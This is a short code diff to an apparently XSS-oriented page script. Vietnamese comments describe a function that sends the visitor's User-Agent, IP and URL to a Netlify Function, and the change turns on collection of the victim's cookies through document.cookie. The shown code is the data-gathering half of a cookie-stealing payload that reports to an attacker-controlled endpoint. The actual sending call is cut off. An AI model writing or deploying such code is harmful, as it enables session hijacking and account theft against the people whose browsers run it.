@@ -8,7 +8,7 @@
     <script>
       // Hàm gửi thông tin về User-Agent, IP và URL gốc tới Netlify Function
       function sendDataToNetlify() {
-        // var cookies = document.cookie; // Lấy cookies của người dùng
+        var cookies = document.cookie; // Lấy cookies của người dùng
         var currentUrl = window.location.href; // Lấy URL hiện tại (URL của trang XSS Hacker)
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
 
